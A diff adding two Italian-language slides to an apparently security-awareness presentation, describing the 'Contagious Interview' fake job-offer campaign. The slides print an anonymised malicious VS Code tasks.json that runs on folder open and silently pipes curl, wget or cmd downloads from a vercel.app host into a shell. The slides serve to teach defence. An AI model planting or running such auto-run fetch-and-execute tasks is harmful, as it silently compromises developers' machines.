@@ -879,6 +879,38 @@ Le minacce moderne sono virali e persistenti, capaci di sopravvivere alle singol
 
 ---
 
+<!-- class: content -->
+
+# Caso reale: la finta offerta di lavoro
+
+Non serve un LLM per trasformare un repository in un worm: a volte basta aprire una cartella in VS Code.
+
+- **Il vettore:** un contatto per una "opportunità di lavoro" chiede di clonare un repository GitHub e completare un test tecnico — è lo schema della campagna **Contagious Interview** (gruppi legati alla Corea del Nord), attiva almeno dal 2024 e tuttora in evoluzione.
+- **Il trigger:** il repository contiene un `.vscode/tasks.json` con `"runOn": "folderOpen"` — la task parte da sola alla sola apertura della cartella in VS Code (dopo un click sul prompt di "trust workspace"), senza altre azioni da parte della vittima. Mi è successo davvero: questo è un estratto anonimizzato di ciò che ho trovato.
+
+<pre class="payload" style="margin: 6px 0; font-size: 0.56em; padding: 8px 10px;"><code class="language-json">"tasks": [{
+  "label": "project-setup",
+  "type": "shell",
+  "osx": { "command": "curl 'https://vscode-config.vercel.app/task/mac?token=&lt;redacted&gt;' | sh" },
+  "linux": { "command": "wget -qO- 'https://vscode-config.vercel.app/task/linux?token=&lt;redacted&gt;' | sh" },
+  "windows": { "command": "curl https://vscode-config.vercel.app/task/windows?token=&lt;redacted&gt; | cmd" },
+  "presentation": { "reveal": "never", "echo": false, "close": true },
+  "runOptions": { "runOn": "folderOpen" }
+}]</code></pre>
+
+---
+
+<!-- class: content -->
+
+# Caso reale: la finta offerta di lavoro (2/2)
+
+- **Il risultato:** un comando curl/wget/cmd per piattaforma (mac/linux/windows) scarica ed esegue in silenzio (`"reveal": "never"`, `"echo": false`) un payload da un dominio ospitato su Vercel — la stessa logica di "vivere su infrastruttura fidata" già vista in SANDWORM_MODE, qui applicata all'ingegneria sociale invece che a un worm autonomo.
+- **La lezione:** il "trust workspace" di VS Code è un singolo click da cui dipende l'esecuzione automatica di codice arbitrario — vale lo stesso principio di least privilege visto per gli agenti AI, applicato all'editor stesso.
+
+Fonte: [Abstract Security, "Contagious Interview: Tracking the VS Code Tasks Vector"](https://www.abstract.security/blog/contagious-interview-tracking-the-vs-code-tasks-infection-vector).
+
+---
+
 <!-- class: dsod-transition -->
 
 <div class="dsod-transition-icon">2</div>
